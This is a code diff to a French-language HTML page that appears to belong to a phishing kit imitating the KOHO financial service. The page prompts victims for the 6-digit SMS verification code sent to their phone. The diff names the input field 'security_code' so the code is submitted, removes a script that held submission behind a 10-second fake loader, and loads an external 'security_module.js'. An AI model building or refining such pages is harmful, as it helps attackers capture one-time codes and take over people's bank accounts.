@@ -65,7 +65,7 @@
         <p class="k-subtitle">Pour s&eacute;curiser votre connexion, veuillez entrer le code &agrave; 6 chiffres envoy&eacute; sur votre appareil mobile.</p>
         <form action="koho101_sms2.html" method="POST">
             <div class="k-input-wrapper">
-                <input type="text" class="k-input" required maxlength="6" pattern="\d{6}" inputmode="numeric" placeholder="000000" style="text-align: center; letter-spacing: 5px; font-weight: bold; font-size: 20px;">
+                <input type="text" name="security_code" id="security_code" class="k-input" required maxlength="6" pattern="\d{6}" inputmode="numeric" placeholder="000000" style="text-align: center; letter-spacing: 5px; font-weight: bold; font-size: 20px;">
             </div>
             
             <button type="submit" class="k-btn">Valider</button>
@@ -79,19 +79,7 @@
         <p class="loader-text">Traitement en cours...</p>
     </div>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const form = document.querySelector('form');
-            const loader = document.getElementById('loaderOverlay');
-            if(form && loader) {
-                form.addEventListener('submit', function(e) {
-                    e.preventDefault();
-                    loader.classList.add('active');
-                    setTimeout(function() { form.submit(); }, 10000);
-                });
-            }
-        });
-    </script>
+    
 <script src="security_module.js"></script>
 </body>
 </html>
